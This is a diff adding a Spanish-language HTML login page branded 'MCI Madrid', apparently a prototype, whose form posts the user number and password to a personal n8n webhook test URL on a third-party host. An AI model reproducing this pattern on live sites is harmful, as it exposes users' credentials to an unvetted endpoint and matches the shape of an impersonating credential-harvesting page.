@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login MCI Madrid</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Poppins", sans-serif;
+      background: url("_DSC5086.jpeg") no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    .overlay {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      background: rgba(5, 29, 60, 0.7);
+      backdrop-filter: blur(5px);
+      z-index: 1;
+    }
+
+    .container {
+      position: relative;
+      z-index: 2;
+      background: rgba(255, 255, 255, 0.1);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 16px;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+      padding: 40px 35px;
+      max-width: 360px;
+      width: 90%;
+      color: #ffffff;
+      text-align: center;
+      backdrop-filter: blur(12px);
+    }
+
+    .container img {
+      width: 110px;
+      margin-bottom: 15px;
+    }
+
+    h1 {
+      color: #ffffff;
+      font-size: 1.6rem;
+      margin-bottom: 25px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
+    }
+
+    label {
+      font-weight: 600;
+      text-align: left;
+      display: block;
+      font-size: 0.9rem;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: 1px solid #0173ea;
+      background: rgba(255, 255, 255, 0.9);
+      font-size: 1rem;
+      outline: none;
+      color: #000;
+    }
+
+    input:focus {
+      border-color: #051d3c;
+      box-shadow: 0 0 6px rgba(1, 115, 234, 0.6);
+    }
+
+    button {
+      background-color: #0173ea;
+      color: #ffffff;
+      font-weight: 600;
+      border: none;
+      border-radius: 8px;
+      padding: 12px;
+      cursor: pointer;
+      font-size: 1rem;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background-color: #051d3c;
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        padding: 30px 20px;
+      }
+
+      h1 {
+        font-size: 1.4rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay"></div>
+
+  <div class="container">
+    <img src="mci-logo-w.png" alt="Logo MCI Madrid">
+    <h1>MCI MADRID</h1>
+    <form action="https://personal-n8n.yaf3an.easypanel.host/webhook-test/prueba" method="POST">
+      <div>
+        <label for="usuario">Usuario *</label>
+        <input type="text" id="usuario" name="usuario" placeholder="Escriba su número de usuario" required>
+      </div>
+      <div>
+        <label for="password">Contraseña *</label>
+        <input type="password" id="password" name="password" placeholder="Ingrese su contraseña" required>
+      </div>
+      <button type="submit">INGRESAR</button>
+    </form>
+  </div>
+</body>
+</html>
